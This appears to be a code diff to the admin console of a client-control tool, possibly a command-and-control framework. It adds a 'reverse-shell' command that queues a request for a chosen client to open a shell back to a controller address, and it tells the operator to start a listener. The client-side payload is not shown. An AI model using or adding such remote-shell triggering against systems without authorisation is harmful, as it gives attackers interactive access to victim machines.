@@ -122,6 +122,11 @@ def build_repl_parser() -> Tuple[
     sub.add_parser("quit", help="Exit the console")
     sub.add_parser("exit", help="Exit the console")
 
+    # reverse-shell (REPL)
+    sp = sub.add_parser("reverse-shell", help="Start a reverse shell to the controller")
+    sp.add_argument("controller_addr", help="Controller address (host:port)")
+    sp.add_argument("--client", required=False)
+
     # Return also a mapping for subparser lookups (for help display)
     subparsers_map = {a.dest: a for a in []}  # placeholder for type clarity
     return p, {sp_prog(p): p for p in sub._name_parser_map.values()}
@@ -475,6 +480,29 @@ async def run_repl(args) -> None:
                 print_error(ui, resp)
             continue
 
+        # ---- reverse shell ----
+        if cmd == "reverse-shell":
+            controller_addr = ns.controller_addr
+            target = _resolve_client(getattr(ns, "client", None))
+            if not controller_addr:
+                print(ui.TAG_ERR, "Controller address required (host:port)")
+                continue
+            if not target:
+                print(ui.TAG_ERR, "No client specified. Use 'use <id>' or pass --client <id>.")
+                continue
+            resp, _ = await admin_send(
+                args.host,
+                args.port,
+                args.auth_token,
+                {"action": "reverse_shell", "target_id": target, "controller_addr": controller_addr},
+            )
+            if resp.get("type") == "QUEUED":
+                print(f"{ui.TAG_QUE} queued: reverse_shell {ui.c('controller_addr=' + controller_addr, 'dim')}")
+                print(f"{ui.TAG_INF} open a listener on {ui.c(controller_addr, 'bold')} to receive the shell")
+            else:
+                print_error(ui, resp)
+            continue
+
         print(ui.TAG_ERR, f"Unknown command: {cmd}")
 
 
@@ -640,6 +668,17 @@ async def classic_cli(args):
             print("Error fetching server status:")
             print(resp)
         return
+    
+    if args.subcmd == "reverse-shell":
+        resp, _ = await admin_send(
+            args.host, args.port, args.auth_token,
+            {"action": "reverse_shell", "target_id": args.client, "controller_addr": args.controller_addr},
+        )
+        if resp.get("type") == "QUEUED":
+            print(f"{ui.TAG_QUE} queued: reverse_shell controller_addr={args.controller_addr}")
+        else:
+            print_error(ui, resp)
+        return
 
 
 def start_server(args):
@@ -776,6 +815,10 @@ async def main():
     )
 
     sp = sub.add_parser("server-status", help="Check the server's health status")
+
+    sp = sub.add_parser("reverse-shell", help="Start a reverse shell to the controller")
+    sp.add_argument("--client", required=False, help="Client ID to target")
+    sp.add_argument("--controller-addr", required=True, help="Controller address (host:port)")
 
     args = ap.parse_args()
 
